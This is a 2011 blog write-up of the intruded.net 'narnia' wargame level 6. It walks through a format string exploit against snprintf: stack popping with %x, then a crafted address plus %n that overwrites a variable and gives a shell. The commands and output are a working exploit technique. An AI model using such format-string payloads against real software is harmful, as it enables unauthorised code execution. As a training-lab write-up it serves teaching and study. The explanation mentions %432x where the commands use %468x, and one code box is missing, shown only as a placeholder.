Title: intruded.net, narnia: level 6
Date: 2011/09/22 22:16
Tags: intruded.net, narnia, x86, stack, printf
Author: Ken Ko

This time it <em>definitely</em> was a string format vulnerability:

<code>
snprintf(buffer, sizeof buffer, argv[1]);
</code>

So first, let's try to find out how far the format string is on the stack from the stack pointer--I think it's referred to as 'stack popping'. Anyhow, we'll end up with this after a bit of brute force:

<code>
level6@narnia:/wargame$ ./level6 AAAA%x.%x.%x.%x.%x.%x.
Change i's value from 1 -&gt; 500. No way...let me give you a hint!
buffer : [AAAA177ff8e.1000000.0.28000000.656e6f6e.41414141.] (49)
i = 1 (0xbffffa4c)
</code>

So we know we need 6 bytes, or pops, to see the value of the memory address at the initial 'AAAA'. We'll need to replace the last with a %n, and eventually print <strong>%10x</strong> for the last <strong>%x</strong>.

<code>
level6@narnia:/wargame$ ./level6 `python -c 'print "\x4c\xfa\xff\xbf"'`%x.%x.%x.%x.%10x.%n
Change i's value from 1 -&gt; 500. No way...let me give you a hint!
buffer : [Lúÿ¿177ff8e.1000000.0.28000000. 656e6f6e.] (42)
i = 42 (0xbffffa4c)
</code>

Cool. Now, let's do some math and make i = 500.

<code>
level6@narnia:/wargame$ ./level6 `python -c 'print "\x4c\xfa\xff\xbf"'`%x.%x.%x.%x.%400x.%n
Change i's value from 1 -&gt; 500. No way...let me give you a hint!
buffer : [Lúÿ¿177ff8e.1000000.0.28000000. ] (63)
i = 432 (0xbffffa4c)
level6@narnia:/wargame$
level6@narnia:/wargame$ ./level6 `python -c 'print "\x4c\xfa\xff\xbf"'`%x.%x.%x.%x.%468x.%n
Change i's value from 1 -&gt; 500. GOOD
sh-3.1$
</code>

Awesome possum.

On the stack, we should have something similar to:

[codebox 1]

<strong>Note</strong>: Our %s is from the "I'll help you by showing you your buffer!" printf() a few lines below the snprintf.

Because our buffer started with AAAA, that's what's printed out when we finally have the correct amount of pops of the stack. So, rather than printing out 'AAAA', we want to move the pointer to the value held in memory location 0xbffffa4c. That's a simple replace and reordering for Intel's little endian.

Next we use %432x.%n to write a total of 500 to the memory location which modifies the value of i. Something I don't use very often is this nifty trick:

<code>
int i;
printf("1234567890%n", &amp;i);
</code>

This will write the value 10 into i. That is, it's similar to the following:

<code>
i = 10;
</code>

I suppose it's more useful in dynamically changing the value of i, if you wish.

Anyhow, that's about it.
